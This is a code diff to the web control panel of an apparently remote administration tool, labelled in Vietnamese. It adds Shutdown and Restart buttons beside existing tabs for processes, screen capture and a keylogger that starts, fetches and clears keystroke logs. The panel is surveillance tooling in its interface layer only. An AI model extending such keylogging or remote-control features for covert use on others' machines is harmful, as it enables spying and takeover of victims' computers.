@@ -83,6 +83,7 @@
         <div class="tab" onclick="switchTab('processes')">⚙️ Tiến trình (Processes)</div>
         <div class="tab" onclick="switchTab('screen')">📸 Màn hình</div>
         <div class="tab" onclick="switchTab('keylog')">⌨️ Keylogger</div>
+        <div class="tab" onclick="switchTab('shutdown')">🔌 Shutdown/Restart</div>
     </div>
     
     <div class="content">
@@ -113,6 +114,13 @@
                 <button class="btn-kill" onclick="sendCmd('keylog_stop')">⏹ Dừng ghi</button>
                 <button class="btn-refresh" onclick="sendCmd('keylog_get')">📥 Lấy dữ liệu</button>
                 <button class="btn-kill" style="background:#666" onclick="sendCmd('keylog_clear')">🗑 Xóa Log</button>
+            </div>
+
+            <div id="toolbar-shutdown" class="toolbar hidden">
+                <button class="btn-kill" style="background:#dc3545" onclick="confirmShutdown()">🔴 Shutdown</button>
+                <button class="btn-kill" style="background:#fd7e14" onclick="confirmRestart()">🔄 Restart</button>
+                <div style="flex:1"></div>
+                <span style="color:#666; font-size:13px">Các lệnh này sẽ được thực hiện ngay lập tức.</span>
             </div>
 
             <div id="view-keylog" class="hidden scroll-area" style="padding: 15px;">
@@ -229,7 +237,7 @@
         event.target.classList.add('active');
 
         // 2. Ẩn HẾT toolbar
-        ['apps', 'processes', 'screen', 'keylog'].forEach(t => {
+        ['apps', 'processes', 'screen', 'keylog', 'shutdown'].forEach(t => {
             document.getElementById(`toolbar-${t}`).classList.add('hidden');
         });
 
@@ -259,9 +267,12 @@
         else if (tab === 'keylog') {
             document.getElementById('view-keylog').classList.remove('hidden');
         }
+        else if (tab === 'shutdown') {
+            // Không cần hiển thị view khác, chỉ hiện toolbar
+        }
         
-        // Không auto-refresh tab screen/keylog để tiết kiệm băng thông
-        if (tab !== 'screen' && tab !== 'keylog') refreshCurrentTab();
+        // Không auto-refresh tab screen/keylog/shutdown để tiết kiệm băng thông
+        if (tab !== 'screen' && tab !== 'keylog' && tab !== 'shutdown') refreshCurrentTab();
     }
 
     function refreshCurrentTab() {
@@ -324,6 +335,20 @@
     }
     function killProcess(pid) {
         if(confirm(`Kill PID ${pid}?`)) sendCmd(`killProcess ${pid}`);
+    }
+
+    function confirmShutdown() {
+        if(confirm('Bạn có chắc muốn TẮT máy tính này không?')) {
+            sendCmd('shutdown');
+            log('Lệnh Shutdown đã gửi...');
+        }
+    }
+
+    function confirmRestart() {
+        if(confirm('Bạn có chắc muốn KHỞI ĐỘNG LẠI máy tính này không?')) {
+            sendCmd('restart');
+            log('Lệnh Restart đã gửi...');
+        }
     }
 
     function sendChat() {
